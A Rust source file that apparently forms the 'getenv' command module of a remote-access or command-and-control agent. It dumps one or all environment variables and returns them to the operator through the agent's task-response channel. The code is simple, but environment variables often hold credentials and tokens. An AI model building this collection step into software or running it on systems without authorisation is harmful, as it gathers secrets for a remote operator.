use crate::structs::Task;
use serde::Deserialize;

#[derive(Deserialize)]
struct GetenvArgs {
    #[serde(default)]
    name: String,
}

pub async fn execute(task: Task) {
    let mut response = task.new_response();

    let args: GetenvArgs = match serde_json::from_str(&task.data.params) {
        Ok(a) => a,
        Err(_) => GetenvArgs { name: task.data.params.clone() },
    };

    if args.name.is_empty() {
        let mut envs: Vec<String> = std::env::vars()
            .map(|(k, v)| format!("{}={}", k, v))
            .collect();
        envs.sort();
        response.user_output = envs.join("\n");
    } else {
        match std::env::var(&args.name) {
            Ok(val) => response.user_output = format!("{}={}", args.name, val),
            Err(_) => response.user_output = format!("{} not set", args.name),
        }
    }
    response.completed = true;

    let _ = task.job.send_responses.send(response).await;
    let _ = task.remove_running_task.send(task.data.task_id.clone()).await;
}
